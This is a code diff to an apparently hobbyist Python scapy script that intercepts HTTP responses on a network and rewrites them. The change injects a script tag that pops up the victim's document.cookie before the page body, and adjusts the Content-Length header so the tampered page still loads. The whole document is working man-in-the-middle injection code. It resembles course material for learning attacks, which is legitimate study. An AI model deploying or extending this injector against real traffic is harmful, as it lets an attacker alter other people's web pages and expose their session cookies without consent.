@@ -24,11 +24,16 @@ def process_packet(packet):
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response type HTTP ")
-            load = re.sub("<body ", "<script>alert('hacked!!! '+document.cookie);</script> <body", scapy_packet[scapy.Raw].load)
+            injecttion_code="<script>alert('hacked!!! '+document.cookie);</script>"
+            load = re.sub("<body ", injecttion_code+"<body ", scapy_packet[scapy.Raw].load)
+            content_lenght = re.search("(?:Content-Length:\s)(\d*)",load)
+            if content_lenght and "text/html" in load:
+                content_lenght = content_lenght.group(1)
+                new_content_length= int(content_lenght)+len(injecttion_code)
+                load = load.replace(str(content_lenght), str(new_content_length))
             scapy_packet= modify_load(scapy_packet, load)
 
         if origin_load != load:
-            print(scapy_packet)
             packet.set_payload(str(scapy_packet))
 
     packet.accept()
